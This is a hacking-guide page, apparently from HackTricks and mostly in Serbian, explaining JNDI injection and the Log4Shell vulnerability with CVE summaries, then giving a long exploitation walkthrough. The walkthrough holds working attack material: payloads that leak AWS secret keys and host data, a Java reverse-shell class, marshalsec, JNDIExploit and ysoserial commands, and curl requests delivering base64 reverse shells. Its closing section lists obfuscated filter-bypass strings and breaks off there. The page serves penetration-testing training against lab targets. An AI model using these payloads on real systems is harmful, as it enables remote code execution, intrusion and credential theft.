# JNDI - Java Naming and Directory Interface & Log4Shell

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Try Hard Security Group**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Basic Information

JNDI, integrisan u Javu od kraja 1990-ih, slu≈æi kao servis za imenovanje, omoguƒáavajuƒái Java programima da lociraju podatke ili objekte putem sistema imenovanja. Podr≈æava razliƒçite servise direktorijuma putem interfejsa provajdera usluga (SPI), omoguƒáavajuƒái preuzimanje podataka iz razliƒçitih sistema, ukljuƒçujuƒái udaljene Java objekte. Uobiƒçajeni SPI ukljuƒçuju CORBA COS, Java RMI Registry i LDAP.

### JNDI Naming Reference

Java objekti mogu biti pohranjeni i preuzeti koristeƒái JNDI Naming References, koji dolaze u dva oblika:

* **Reference Addresses**: Specifikuje lokaciju objekta (npr., _rmi://server/ref_), omoguƒáavajuƒái direktno preuzimanje sa navedene adrese.
* **Remote Factory**: Referencira klasu udaljene fabrike. Kada se pristupi, klasa se preuzima i instancira sa udaljene lokacije.

Meƒëutim, ovaj mehanizam mo≈æe biti zloupotrebljen, ≈°to mo≈æe dovesti do uƒçitavanja i izvr≈°avanja proizvoljnog koda. Kao protivmera:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` po defaultu od JDK 7u21, ograniƒçavajuƒái uƒçitavanje udaljenih objekata. Security Manager dodatno ograniƒçava ≈°ta mo≈æe biti uƒçitano.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` po defaultu od JDK 6u141, 7u131, 8u121, blokirajuƒái izvr≈°avanje udaljeno uƒçitanih Java objekata. Ako je postavljeno na `true`, moguƒáe je izvr≈°avanje udaljenog koda bez nadzora Security Manager-a.
* **CORBA**: Nema specifiƒçnu osobinu, ali je Security Manager uvek aktivan.

Meƒëutim, **Naming Manager**, odgovoran za re≈°avanje JNDI linkova, nema ugraƒëene bezbednosne mehanizme, ≈°to mo≈æe omoguƒáiti preuzimanje objekata iz bilo kog izvora. Ovo predstavlja rizik jer se RMI, LDAP i CORBA za≈°tite mogu zaobiƒái, ≈°to dovodi do uƒçitavanja proizvoljnih Java objekata ili zloupotrebe postojeƒáih komponenti aplikacije (gadgets) za pokretanje malicioznog koda.

Primeri zloupotrebljivih URL-ova ukljuƒçuju:

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

Uprkos za≈°titama, ranjivosti ostaju, uglavnom zbog nedostatka za≈°tite protiv uƒçitavanja JNDI iz nepouzdanih izvora i moguƒánosti zaobila≈æenja postojeƒáih za≈°tita.

### JNDI Example

![](<../../.gitbook/assets/image (1022).png>)

ƒåak i ako ste postavili **`PROVIDER_URL`**, mo≈æete naznaƒçiti drugaƒçiji u pretrazi i biƒáe pristupljeno: `ctx.lookup("<attacker-controlled-url>")` i to je ono ≈°to ƒáe napadaƒç zloupotrebiti da uƒçita proizvoljne objekte iz sistema koji on kontroli≈°e.

### CORBA Overview

CORBA (Common Object Request Broker Architecture) koristi **Interoperable Object Reference (IOR)** za jedinstveno identifikovanje udaljenih objekata. Ova referenca ukljuƒçuje osnovne informacije kao ≈°to su:

* **Type ID**: Jedinstveni identifikator za interfejs.
* **Codebase**: URL za dobijanje stub klase.

Va≈æno je napomenuti da CORBA nije inherentno ranjiv. Osiguranje bezbednosti obiƒçno ukljuƒçuje:

* Instalaciju **Security Manager-a**.
* Konfiguraciju Security Manager-a da dozvoli veze sa potencijalno malicioznim kod bazama. To se mo≈æe postiƒái kroz:
* Socket dozvolu, npr., `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
* Dozvole za ƒçitanje fajlova, bilo univerzalno (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) ili za specifiƒçne direktorijume gde bi maliciozni fajlovi mogli biti sme≈°teni.

Meƒëutim, neke politike provajdera mogu biti blage i dozvoliti ove veze po defaultu.

### RMI Context

Za RMI (Remote Method Invocation), situacija je donekle drugaƒçija. Kao i kod CORBA, uƒçitavanje proizvoljnih klasa je po defaultu ograniƒçeno. Da bi se zloupotrebio RMI, obiƒçno bi bilo potrebno zaobiƒái Security Manager, ≈°to je takoƒëe relevantno u CORBA.

### LDAP

Prvo, potrebno je razlikovati izmeƒëu pretrage i pretrage po imenu.\
**Pretraga** ƒáe koristiti URL kao `ldap://localhost:389/o=JNDITutorial` da pronaƒëe JNDITutorial objekat sa LDAP servera i **preuzme njegove atribute**.\
**Pretraga po imenu** je namenjena za **imenovanje servisa** jer ≈æelimo da dobijemo **≈°ta god je vezano za ime**.

Ako je LDAP pretraga pozvana sa **SearchControls.setReturningObjFlag() sa `true`, tada ƒáe vraƒáeni objekat biti rekonstruisan**.

Stoga, postoji nekoliko naƒçina da se napadnu ove opcije.\
**Napadaƒç mo≈æe otrovati LDAP zapise uvodeƒái payload-e** u njih koji ƒáe biti izvr≈°eni u sistemima koji ih prikupljaju (veoma korisno za **kompromitovanje desetina ma≈°ina** ako imate pristup LDAP serveru). Drugi naƒçin da se ovo zloupotrebi bio bi da se izvr≈°i **MitM napad u LDAP pretrazi**, na primer.

U sluƒçaju da mo≈æete **naterati aplikaciju da re≈°i JNDI LDAP URL**, mo≈æete kontrolisati LDAP koji ƒáe biti pretra≈æen, i mogli biste poslati nazad exploit (log4shell).

#### Deserialization exploit

![](<../../.gitbook/assets/image (275).png>)

**Eksploit je serijalizovan** i biƒáe deseralizovan.\
U sluƒçaju da je `trustURLCodebase` `true`, napadaƒç mo≈æe pru≈æiti svoje klase u kod bazi, ako ne, moraƒáe da zloupotrebi gadgets u classpath-u.

#### JNDI Reference exploit

Lak≈°e je napasti ovaj LDAP koristeƒái **JavaFactory reference**:

![](<../../.gitbook/assets/image (1059).png>)

## Log4Shell Vulnerability

Ranjivost je uvedena u Log4j jer podr≈æava [**posebnu sintaksu**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) u obliku `${prefix:name}` gde je `prefix` jedan od niza razliƒçitih [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) gde bi `name` trebao biti evaluiran. Na primer, `${java:version}` je trenutna verzija Jave koja se izvr≈°ava.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) je uveo `jndi` Lookup funkciju. Ova funkcija omoguƒáava preuzimanje varijabli putem JNDI. Obiƒçno, kljuƒç se automatski prefiksira sa `java:comp/env/`. Meƒëutim, ako kljuƒç sam ukljuƒçuje **":"**, ovaj defaultni prefiks se ne primenjuje.

Sa **: prisutnim** u kljuƒçu, kao u `${jndi:ldap://example.com/a}` nema **prefiksa** i **LDAP server se upituje za objekat**. I ovi Lookups mogu se koristiti i u konfiguraciji Log4j kao i kada se linije bele≈æe.

Stoga, jedina stvar potrebna za dobijanje RCE je **ranjiva verzija Log4j koja obraƒëuje informacije koje kontroli≈°e korisnik**. I zato ≈°to je ovo biblioteka koja se ≈°iroko koristi od strane Java aplikacija za bele≈æenje informacija (ukljuƒçujuƒái aplikacije koje su dostupne na internetu), bilo je veoma uobiƒçajeno da log4j bele≈æi, na primer, HTTP zaglavlja koja su primljena kao ≈°to je User-Agent. Meƒëutim, log4j se **ne koristi samo za bele≈æenje HTTP informacija veƒá i za bilo koji unos** i podatke koje je programer naznaƒçio.

## Overview of Log4Shell-Related CVEs

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critical]**

Ova ranjivost je kritiƒçna **gre≈°ka u nepouzdanom deseralizovanju** u `log4j-core` komponenti, koja utiƒçe na verzije od 2.0-beta9 do 2.14.1. Omoguƒáava **daljinsko izvr≈°avanje koda (RCE)**, omoguƒáavajuƒái napadaƒçima da preuzmu sisteme. Problem je prijavio Chen Zhaojun iz Alibaba Cloud Security Team i utiƒçe na razliƒçite Apache okvire. Prvobitno re≈°enje u verziji 2.15.0 je bilo nepotpuno. Sigma pravila za odbranu su dostupna ([Rule 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [Rule 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Critical]**

Prvobitno ocenjen kao nizak, ali kasnije unapreƒëen na kritiƒçan, ovaj CVE je **gre≈°ka u uslovima usluge (DoS)** koja proizilazi iz nepotpunog re≈°enja u 2.15.0 za CVE-2021-44228. Uticaƒáe na ne-podrazumevane konfiguracije, omoguƒáavajuƒái napadaƒçima da izazovu DoS napade putem kreiranih payload-a. [Tweet](https://twitter.com/marcioalm/status/1471740771581652995) prikazuje metodu zaobila≈æenja. Problem je re≈°en u verzijama 2.16.0 i 2.12.2 uklanjanjem obrazaca pretrage poruka i onemoguƒáavanjem JNDI po defaultu.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[High]**

Uticaƒáe na **Log4j 1.x verzije** u ne-podrazumevanim konfiguracijama koje koriste `JMSAppender`, ovaj CVE je gre≈°ka u nepouzdanom deseralizovanju. Nema re≈°enja dostupnog za 1.x granu, koja je zavr≈°ila svoj ≈æivotni ciklus, i preporuƒçuje se nadogradnja na `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderate]**

Ova ranjivost utiƒçe na **Logback logging framework**, naslednika Log4j 1.x. Prethodno smatrano sigurnim, okviro je pronaƒëen ranjivim, a nove verzije (1.3.0-alpha11 i 1.2.9) su objavljene kako bi se re≈°io problem.

### **CVE-2021-45105** **\[High]**

Log4j 2.16.0 sadr≈æi DoS gre≈°ku, ≈°to je dovelo do objavljivanja `log4j 2.17.0` kako bi se ispravila CVE. Dodatni detalji su u izve≈°taju BleepingComputer-a [report](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

Uticaƒáe na log4j verziju 2.17, ovaj CVE zahteva da napadaƒç kontroli≈°e konfiguracioni fajl log4j. Ukljuƒçuje potencijalno izvr≈°avanje proizvoljnog koda putem konfigurisanog JDBCAppender-a. Vi≈°e detalja je dostupno u [Checkmarx blog postu](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Log4Shell Exploitation

### Discovery

Ova ranjivost je veoma lako otkriti ako nije za≈°tiƒáena jer ƒáe poslati barem **DNS zahtev** na adresu koju navedete u svom payload-u. Stoga, payload-ovi kao ≈°to su:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (koristeƒái [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (koristeƒái [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (koristeƒái Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (koristeƒái [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` koristeƒái (koristeƒái [huntress](https://log4shell.huntress.com))

Napomena: **ƒçak i ako je primljen DNS zahtev, to ne znaƒçi da je aplikacija ranjiva** (ili ƒçak ranjiva), moraƒáete da poku≈°ate da je zloupotrebite.

{% hint style="info" %}
Zapamtite da da biste **zloupotrebili verziju 2.15** morate dodati **zaobila≈æenje provere localhost**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Local Discovery**

Pretra≈æite **lokalne ranjive verzije** biblioteke sa:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verifikacija**

Neke od platformi navedenih ranije ƒáe vam omoguƒáiti da unesete neke promenljive podatke koji ƒáe biti zabele≈æeni kada se zatra≈æe.\
To mo≈æe biti veoma korisno za 2 stvari:

* Da **verifikujete** ranjivost
* Da **ekstrahujete informacije** zloupotrebljavajuƒái ranjivost

Na primer, mogli biste zatra≈æiti ne≈°to poput:\
ili kao `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** i ako je **primljen DNS zahtev sa vredno≈°ƒáu env promenljive**, znate da je aplikacija ranjiva.

Druge informacije koje biste mogli poku≈°ati da **iscurite**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Information

{% hint style="info" %}
Hostovi koji rade na JDK verzijama iznad 6u141, 7u131 ili 8u121 su za≈°tiƒáeni od LDAP napada. To je zbog podrazumevane deaktivacije `com.sun.jndi.ldap.object.trustURLCodebase`, koja spreƒçava JNDI da uƒçita udaljenu bazu koda putem LDAP-a. Meƒëutim, va≈æno je napomenuti da ove verzije **nisu za≈°tiƒáene od napada deserializacije**.

Za napadaƒçe koji ≈æele da iskoriste ove vi≈°e JDK verzije, neophodno je iskoristiti **pouzdani gadget** unutar Java aplikacije. Alati poput ysoserial ili JNDIExploit se ƒçesto koriste u tu svrhu. S druge strane, iskori≈°ƒáavanje ni≈æih JDK verzija je relativno lak≈°e jer se ove verzije mogu manipulisati da uƒçitaju i izvr≈°e proizvoljne klase.

Za **vi≈°e informacija** (_poput ograniƒçenja na RMI i CORBA vektore_) **proverite prethodni deo JNDI Naming Reference** ili [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec sa prilagoƒëenim payload-om

Mo≈æete testirati ovo u **THM box-u:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Koristite alat [**marshalsec**](https://github.com/mbechler/marshalsec) (jar verzija dostupna [**ovde**](https://github.com/RandomRobbieBF/marshalsec-jar)). Ovaj pristup uspostavlja LDAP referral server za preusmeravanje konekcija na sekundarni HTTP server gde ƒáe biti hostovan exploit:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Da biste naterali metu da uƒçita kod za reverznu ljusku, kreirajte Java datoteku pod imenom `Exploit.java` sa sledeƒáim sadr≈æajem:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Kompajlirajte Java datoteku u klasu koristeƒái: `javac Exploit.java -source 8 -target 8`. Zatim, pokrenite **HTTP server** u direktorijumu koji sadr≈æi klasu sa: `python3 -m http.server`. Osigurajte da **marshalsec LDAP server** upuƒáuje na ovaj HTTP server.

Pokrenite izvr≈°enje klase eksploata na podlo≈ænom veb serveru slanjem payload-a koji liƒçi na:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**–ù–∞–ø–æ–º–µ–Ω–∞:** –û–≤–∞—ò –µ–∫—Å–ø–ª–æ–∏—Ç —Å–µ –æ—Å–ª–∞—ö–∞ –Ω–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—ò—É –à–∞–≤–µ –∫–æ—ò–∞ –¥–æ–∑–≤–æ—ô–∞–≤–∞ —É—á–∏—Ç–∞–≤–∞—ö–µ –∫–æ–¥–Ω–µ –±–∞–∑–µ –Ω–∞ –¥–∞—ô–∏–Ω—É –ø—Ä–µ–∫–æ LDAP. –ê–∫–æ —Ç–æ –Ω–∏—ò–µ –¥–æ–∑–≤–æ—ô–µ–Ω–æ, —Ä–∞–∑–º–∏—Å–ª–∏—Ç–µ –æ –µ–∫—Å–ø–ª–æ–∞—Ç–∞—Ü–∏—ò–∏ –ø–æ—É–∑–¥–∞–Ω–µ –∫–ª–∞—Å–µ –∑–∞ –ø—Ä–æ–∏–∑–≤–æ—ô–Ω–æ –∏–∑–≤—Ä—à–∞–≤–∞—ö–µ –∫–æ–¥–∞.

### RCE - **JNDIExploit**

{% hint style="info" %}
–ò–º–∞—ò—Ç–µ –Ω–∞ —É–º—É –¥–∞ —ò–µ –∏–∑ –Ω–µ–∫–æ–≥ —Ä–∞–∑–ª–æ–≥–∞ –∞—É—Ç–æ—Ä —É–∫–ª–æ–Ω–∏–æ –æ–≤–∞—ò –ø—Ä–æ—ò–µ–∫–∞—Ç —Å–∞ –≥–∏—Ç—Ö–∞–±–∞ –Ω–∞–∫–æ–Ω –æ—Ç–∫—Ä–∏–≤–∞—ö–∞ log4shell. –ú–æ–∂–µ—Ç–µ –ø—Ä–æ–Ω–∞—õ–∏ –∫–µ—à–∏—Ä–∞–Ω—É –≤–µ—Ä–∑–∏—ò—É –Ω–∞ [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), –∞–ª–∏ –∞–∫–æ –∂–µ–ª–∏—Ç–µ –¥–∞ –ø–æ—à—Ç—É—ò–µ—Ç–µ –æ–¥–ª—É–∫—É –∞—É—Ç–æ—Ä–∞, –∫–æ—Ä–∏—Å—Ç–∏—Ç–µ –¥—Ä—É–≥—É –º–µ—Ç–æ–¥—É –∑–∞ –µ–∫—Å–ø–ª–æ–∞—Ç–∞—Ü–∏—ò—É –æ–≤–µ —Ä–∞—ö–∏–≤–æ—Å—Ç–∏.

–®—Ç–∞–≤–∏—à–µ, –Ω–µ –º–æ–∂–µ—Ç–µ –ø—Ä–æ–Ω–∞—õ–∏ –∏–∑–≤–æ—Ä–Ω–∏ –∫–æ–¥ —É wayback machine, –ø–∞ –∏–ª–∏ –∞–Ω–∞–ª–∏–∑–∏—Ä–∞—ò—Ç–µ –∏–∑–≤–æ—Ä–Ω–∏ –∫–æ–¥, –∏–ª–∏ –∏–∑–≤—Ä—à–∏—Ç–µ jar –∑–Ω–∞—ò—É—õ–∏ –¥–∞ –Ω–µ –∑–Ω–∞—Ç–µ —à—Ç–∞ –∏–∑–≤—Ä—à–∞–≤–∞—Ç–µ.
{% endhint %}

–ó–∞ –æ–≤–∞—ò –ø—Ä–∏–º–µ—Ä –º–æ–∂–µ—Ç–µ —Å–∞–º–æ –ø–æ–∫—Ä–µ–Ω—É—Ç–∏ –æ–≤–∞—ò **—Ä–∞—ö–∏–≤–∏ –≤–µ–± —Å–µ—Ä–≤–µ—Ä –∑–∞ log4shell** –Ω–∞ –ø–æ—Ä—Ç—É 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_—É README-—É —õ–µ—Ç–µ –Ω–∞—õ–∏ –∫–∞–∫–æ –¥–∞ –≥–∞ –ø–æ–∫—Ä–µ–Ω–µ—Ç–µ_). –û–≤–∞ —Ä–∞—ö–∏–≤–∞ –∞–ø–ª–∏–∫–∞—Ü–∏—ò–∞ –±–µ–ª–µ–∂–∏ —Å–∞ —Ä–∞—ö–∏–≤–æ–º –≤–µ—Ä–∑–∏—ò–æ–º log4shell —Å–∞–¥—Ä–∂–∞—ò HTTP –∑–∞—Ö—Ç–µ–≤–∞ –∑–∞–≥–ª–∞–≤—ô–∞ _X-Api-Version_.

–ó–∞—Ç–∏–º, –º–æ–∂–µ—Ç–µ –ø—Ä–µ—É–∑–µ—Ç–∏ **JNDIExploit** jar –¥–∞—Ç–æ—Ç–µ–∫—É –∏ –∏–∑–≤—Ä—à–∏—Ç–∏ —ò–µ —Å–∞:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
–ü–æ—Å–ª–µ —á–∏—Ç–∞—ö–∞ –∫–æ–¥–∞ —Å–∞–º–æ –Ω–µ–∫–æ–ª–∏–∫–æ –º–∏–Ω—É—Ç–∞, —É _com.feihong.ldap.LdapServer_ –∏ _com.feihong.ldap.HTTPServer_ –º–æ–∂–µ—Ç–µ –≤–∏–¥–µ—Ç–∏ –∫–∞–∫–æ —Å–µ **LDAP –∏ HTTP —Å–µ—Ä–≤–µ—Ä–∏ –∫—Ä–µ–∏—Ä–∞—ò—É**. LDAP —Å–µ—Ä–≤–µ—Ä —õ–µ —Ä–∞–∑—É–º–µ—Ç–∏ –∫–æ—ò–∏ payload —Ç—Ä–µ–±–∞ –¥–∞ –±—É–¥–µ –ø–æ—Å–ª—É–∂–µ–Ω –∏ –ø—Ä–µ—É—Å–º–µ—Ä–∏—õ–µ –∂—Ä—Ç–≤—É –Ω–∞ HTTP —Å–µ—Ä–≤–µ—Ä, –∫–æ—ò–∏ —õ–µ –ø–æ—Å–ª—É–∂–∏—Ç–∏ –µ–∫—Å–ø–ª–æ–∏—Ç.\
–£ _com.feihong.ldap.gadgets_ –º–æ–∂–µ—Ç–µ –ø—Ä–æ–Ω–∞—õ–∏ **–Ω–µ–∫–µ —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω–µ –≥–∞–¥–≥–µ—Ç–µ** –∫–æ—ò–∏ —Å–µ –º–æ–≥—É –∫–æ—Ä–∏—Å—Ç–∏—Ç–∏ –∑–∞ –∏–∑–≤—Ä—à–∞–≤–∞—ö–µ –∂–µ—ô–µ–Ω–µ –∞–∫—Ü–∏—ò–µ (–ø–æ—Ç–µ–Ω—Ü–∏—ò–∞–ª–Ω–æ –∏–∑–≤—Ä—à–∞–≤–∞—ö–µ –ø—Ä–æ–∏–∑–≤–æ—ô–Ω–æ–≥ –∫–æ–¥–∞). –ê —É _com.feihong.ldap.template_ –º–æ–∂–µ—Ç–µ –≤–∏–¥–µ—Ç–∏ —Ä–∞–∑–ª–∏—á–∏—Ç–µ –∫–ª–∞—Åe —à–∞–±–ª–æ–Ω–∞ –∫–æ—ò–µ —õ–µ **–≥–µ–Ω–µ—Ä–∏—Å–∞—Ç–∏ –µ–∫—Å–ø–ª–æ–∏—Ç–µ**.

–ú–æ–∂–µ—Ç–µ –≤–∏–¥–µ—Ç–∏ —Å–≤–µ –¥–æ—Å—Ç—É–ø–Ω–µ –µ–∫—Å–ø–ª–æ–∏—Ç–µ —Å–∞ **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. –ù–µ–∫–µ –∫–æ—Ä–∏—Å–Ω–µ —Å—É:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Dakle, u na≈°em primeru, veƒá imamo tu ranjivu aplikaciju na dockeru koja radi. Da bismo je napali:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Kada ≈°aljete napade, videƒáete neki izlaz u terminalu gde ste izvr≈°ili **JNDIExploit-1.2-SNAPSHOT.jar**.

**Zapamtite da proverite `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` za druge opcije eksploatacije. Pored toga, u sluƒçaju da vam zatreba, mo≈æete promeniti port LDAP i HTTP servera.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Na sliƒçan naƒçin kao prethodni exploit, mo≈æete poku≈°ati da koristite [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) da iskoristite ovu ranjivost.\
Mo≈æete generisati URL-ove koje ƒáete poslati ≈ærtvi pokretanjem:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Ovaj napad koristeƒái prilagoƒëeni generisani java objekat ƒáe raditi u laboratorijama kao ≈°to je **THM solar room**. Meƒëutim, ovo obiƒçno neƒáe raditi (jer je po defaultu Java konfigurisana da ne uƒçitava udaljene kod baze koristeƒái LDAP) mislim zato ≈°to ne zloupotrebljava poverljivu klasu za izvr≈°avanje proizvoljnog koda._

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) je jo≈° jedan alat za generisanje **funkcionalnih JNDI linkova** i pru≈æanje pozadinskih usluga pokretanjem RMI servera, LDAP servera i HTTP servera.\

### RCE - ysoserial & JNDI-Exploit-Kit

Ova opcija je zaista korisna za napad na **Java verzije koje su konfigurisane da veruju samo odreƒëenim klasama i ne svima**. Stoga, **ysoserial** ƒáe biti kori≈°ƒáen za generisanje **serijalizacija poverljivih klasa** koje se mogu koristiti kao ureƒëaji za **izvr≈°avanje proizvoljnog koda** (_poverenljiva klasa koju zloupotrebljava ysoserial mora biti kori≈°ƒáena od strane ≈ærtvinog java programa kako bi eksploatacija radila_).

Kori≈°ƒáenjem **ysoserial** ili [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) mo≈æete kreirati eksploataciju deserializacije koja ƒáe biti preuzeta od strane JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Koristite [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) da generi≈°ete **JNDI linkove** gde ƒáe eksploatacija ƒçekati na veze sa ranjivim ma≈°inama. Mo≈æete poslu≈æiti **razliƒçite eksploate koji se mogu automatski generisati** pomoƒáu JNDI-Exploit-Kit ili ƒçak va≈°e **vlastite deserializacione payload-e** (generisane od vas ili ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (1118).png>)

Sada mo≈æete lako koristiti generisanu JNDI vezu da iskoristite ranjivost i dobijete **reverse shell** jednostavno ≈°aljuƒái na ranjivu verziju log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Obila≈æenja
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
